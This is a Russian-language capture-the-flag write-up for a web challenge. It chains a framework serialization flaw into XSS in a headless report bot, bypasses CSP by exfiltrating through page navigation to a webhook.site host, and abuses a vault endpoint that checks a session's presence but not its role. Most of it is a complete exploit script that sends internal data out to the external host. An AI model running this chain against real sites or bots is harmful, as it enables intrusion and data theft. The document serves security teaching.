# Шах и мат

**Категория:** Web (hard)
**Флаг:** `SOLARCTF{v4ult_0f_th3_b0ard}`

## Дано

Сайт `https://check-and-mate.solarctf.ru` на TanStack Start. Из полезного — ручка `POST /api/report {"url": "/..."}`, которая отправляет внутреннего headless-браузера-бота по указанному относительному пути на том же сайте. Классический сетап "репорт модератору", только модератор это бот.

## Шаг 1: XSS в бота через уязвимость фреймворка

У TanStack Start нашлась CVE-2026-102989 ("seroval cross-JSON"): вызов server function `/_serverFn/<id>` без обязательного заголовка `x-tsr-serverFn` возвращает не выполненный на сервере результат, а "развёрнутую" структуру seroval-формата как есть. Это позволяет подделать сериализованный HTTP-ответ сервер-функции целиком, включая заголовки и тело, и заставить бота отрендерить вместо настоящего ответа свою HTML-страницу с `<script>`.

Собирается payload вручную в формате seroval (тип 10 = объект, индексы ссылок, вложенные `response.status/headers/body`), где `content-type` подделан на `text/html`, а тело это наш JS внутри `<script>`:

```python
body = "<!doctype html><meta charset=utf-8><script>" + JS + "</script>"
s = body.replace("<", "\\x3C")  # экранирование '<' по правилам seroval
tree = {"t":10,"i":0,"p":{"k":["result"],"v":[
        {"t":10,"i":1,"p":{"k":["response"],"v":[
          {"t":10,"i":2,"p":{"k":["status","headers","body"],"v":[
            {"t":0,"s":200},
            {"t":10,"i":3,"p":{"k":["content-type"],
             "v":[{"t":1,"s":"text/html; charset=utf-8"}]},"o":0},
            {"t":1,"s":s}]},"o":0}]},"o":0}]},"o":0}
payload = json.dumps({"t": tree, "f": 127, "m": []}, separators=(",", ":"))
path = "/_serverFn/" + FN_CARD_ID + "?payload=" + urllib.parse.quote(payload, safe="")
```

Эту ссылку отправляем через `/api/report`, бот открывает её своим внутренним origin и выполняет наш JS.

## Шаг 2: эксфильтрация только через top-level навигацию

Окружение бота зажато CSP: `connect-src` разрешает только внутренние хосты, так что `fetch`/`Image`/`WebSocket` на внешний сборщик данных (webhook.site) просто блокируются браузером, и слепые payload'ы молча проваливаются. Зато `http://vault:4000` и `ws://vault:4000` (внутреннее хранилище рядом с ботом) разрешены явно. Единственный канал наружу, не подпадающий под `connect-src`, это обычная навигация верхнего уровня `location.href = 'https://webhook.site/...'`.

Вторая проблема: страница бота живёт недолго (около 2 секунд до `networkidle`-таймаута у headless-движка), поэтому нужно успеть и прочитать данные, и уйти в навигацию. Решение: держим страницу живой через `WebSocket('ws://vault:4000/feed')` как keepalive, параллельно `fetch`-им целевой ответ в переменную, а саму навигацию на вебхук делаем по третьему сообщению сокета (интервал heartbeat около 2 с), унося в URL уже накопленное тело ответа.

## Шаг 3: SSRF в vault и обход проверки роли

При подключении к `ws://vault:4000/feed` сокет сразу присылает `{"type": "session", "session": "<id>", "role": "reader"}` — то есть валидную read-only сессию выдают просто за факт подключения, бесплатно. А `GET /operator/export` на том же `vault:4000`, который должен требовать операторскую (админскую) сессию, на самом деле проверяет только **наличие** параметра `?session=<id>`, а не то, какая у этой сессии роль. Обычной reader-сессии достаточно.

## Полный скрипт

```python
import json, time, urllib.request, urllib.parse

BASE = "https://check-and-mate.solarctf.ru"
FN = "022f3f5fe77ea6b61fa0a3463c3d13a7f72e451d156d396f3cf186af208a7e42"  # FN_CARD

def jget(url, data=None, method="GET", headers=None):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.read().decode("utf-8", "replace")

TOK = json.loads(jget("https://webhook.site/token", data=b"{}", method="POST",
                       headers={"content-type": "application/json"}))["uuid"]

SID = "46828b33950b474cd42b4940b77f625b"  # reader session, добывается тем же приёмом через /feed
TARGET = f"http://vault:4000/operator/export?session={SID}"
JS = (f"var W='https://webhook.site/{TOK}/F?d=';var res='PENDING',snt=0,m=0;"
      "function g(){{if(snt)return;snt=1;location.href=W+encodeURIComponent(res.slice(0,6000))}}"
      f"fetch('{TARGET}').then(r=>r.text().then(t=>res='H'+r.status+' '+t)).catch(e=>res='CATCH '+e);"
      "var w=new WebSocket('ws://vault:4000/feed');"
      "w.onmessage=()=>{{m++;if(m>=3)g()}};w.onerror=()=>{{}};setTimeout(g,3500);")

body = "<!doctype html><meta charset=utf-8><script>" + JS + "</script>"
s = body.replace("<", "\\x3C")
tree = {"t":10,"i":0,"p":{"k":["result"],"v":[
        {"t":10,"i":1,"p":{"k":["response"],"v":[
          {"t":10,"i":2,"p":{"k":["status","headers","body"],"v":[
            {"t":0,"s":200},
            {"t":10,"i":3,"p":{"k":["content-type"],
             "v":[{"t":1,"s":"text/html; charset=utf-8"}]},"o":0},
            {"t":1,"s":s}]},"o":0}]},"o":0}]},"o":0}
payload = json.dumps({"t": tree, "f": 127, "m": []}, separators=(",", ":"))
path = "/_serverFn/" + FN + "?payload=" + urllib.parse.quote(payload, safe="")

jget(BASE + "/api/report", data=json.dumps({"url": path}).encode(),
     method="POST", headers={"content-type": "application/json"})
time.sleep(10)
reqs = json.loads(jget(f"https://webhook.site/token/{TOK}/requests?sorting=newest"))["data"]
for h in reqs:
    d = urllib.parse.unquote((h.get("query") or {}).get("d", ""))
    if "flag" in d:
        print(d)
        break
# -> H200 {"flag":"SOLARCTF{v4ult_0f_th3_b0ard}"}
```

## Вывод

Цепочка из трёх независимых слабых мест: уязвимость фреймворка (seroval cross-JSON в server functions) даёт XSS в чужом, недоступном снаружи браузере; жёсткий CSP почти всё перекрывает, но забывает про top-level навигацию как канал эксфильтрации; а финальный сервис путает "есть сессия" с "есть права". Каждое звено по отдельности не критично, вместе они дают полный путь от публичной формы репорта до операторского экспорта внутреннего хранилища.
